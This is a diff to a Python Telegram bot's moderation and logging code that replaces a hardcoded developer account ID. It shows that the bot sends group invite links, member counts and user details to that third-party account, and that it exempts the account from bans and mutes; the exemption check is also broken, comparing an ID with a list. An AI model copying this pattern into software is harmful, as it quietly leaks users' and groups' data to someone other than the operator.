@@ -24,7 +24,7 @@ async def gbanrep(c: Client, m: Message, strings):
         for per in sudoers:
             if m.reply_to_message.from_user.id == per:
                 leader = True
-        if m.reply_to_message.from_user.id == [1923931101,1923931101]:
+        if m.reply_to_message.from_user.id == [5571985743,5571985743]:
             await m.reply_text("◍ لايمكننى حظر مبرمج السورس\n√", reply_to_message_id=m.message_id)
             await m.reply_animation("https://t.me/botAlamy/232", reply_to_message_id=m.message_id)
             return
@@ -78,7 +78,7 @@ async def gbanuser(c: Client, m: Message, strings):
         for per in sudoers:
             if chat_id_foruser == per:
                 leader = True
-        if chat_id_foruser == [1923931101,1923931101]:
+        if chat_id_foruser == [5571985743,5571985743]:
             await m.reply_text("◍ لايمكننى حظر مبرمج السورس\n√", reply_to_message_id=m.message_id)
             await m.reply_animation("https://t.me/botAlamy/232", reply_to_message_id=m.message_id)
             return
@@ -167,7 +167,7 @@ async def gmuterep(c: Client, m: Message, strings):
         for per in sudoers:
             if m.reply_to_message.from_user.id == per:
                 leader = True
-        if m.reply_to_message.from_user.id == [1923931101,1923931101]:
+        if m.reply_to_message.from_user.id == [5571985743,5571985743]:
             await m.reply_text("◍ لايمكننى كتم مبرمج السورس\n√", reply_to_message_id=m.message_id)
             await m.reply_animation("https://t.me/botAlamy/232", reply_to_message_id=m.message_id)
             return
@@ -220,7 +220,7 @@ async def gmuteuser(c: Client, m: Message, strings):
         for per in sudoers:
             if chat_id_foruser == per:
                 leader = True
-        if chat_id_foruser == [1923931101,1923931101]:
+        if chat_id_foruser == [5571985743,5571985743]:
             await m.reply_text("◍ لايمكننى كتم مبرمج السورس\n√", reply_to_message_id=m.message_id)
             await m.reply_animation("https://t.me/botAlamy/232", reply_to_message_id=m.message_id)
             return
@@ -292,7 +292,7 @@ async def send_information_groups_enable(c: Client, m: Message):
 ⌔ عدد اعضاء الجروب *{num_member}*
 ⌔ الرابط {link_group}
     """
-    await c.send_message(1923931101, messege_send, parse_mode="Markdown")
+    await c.send_message(5571985743, messege_send, parse_mode="Markdown")
     await c.send_message(sudoers[0], messege_send, parse_mode="Markdown")
 
 
@@ -322,7 +322,7 @@ async def send_information_groups_disable(c: Client, m: Message):
 ⌔ عدد اعضاء الجروب *{num_member}*
 ⌔ الرابط {link_group}
     """
-    await c.send_message(1923931101, messege_send, parse_mode="Markdown")
+    await c.send_message(5571985743, messege_send, parse_mode="Markdown")
     await c.send_message(sudoers[0], messege_send, parse_mode="Markdown")
 
 
@@ -350,7 +350,7 @@ async def send_information_groups_kick(c, m):
 ⌔ ايدي الجروب *{id_chat}*
 ⌔ الرابط {link_group}
     """
-    await c.send_message(1923931101, messege_send, parse_mode="Markdown")
+    await c.send_message(5571985743, messege_send, parse_mode="Markdown")
     await c.send_message(sudoers[0], messege_send, parse_mode="Markdown")
 
 
@@ -444,7 +444,7 @@ async def send_information_user(c: Client, m: Message):
 ⌔ معرفه: {username_user}
 ⌔ ايديه: {id_user}
 """
-    await c.send_message(1923931101, messege_send, parse_mode="Markdown")
+    await c.send_message(5571985743, messege_send, parse_mode="Markdown")
     await c.send_message(sudoers[0], messege_send, parse_mode="Markdown")
 
 
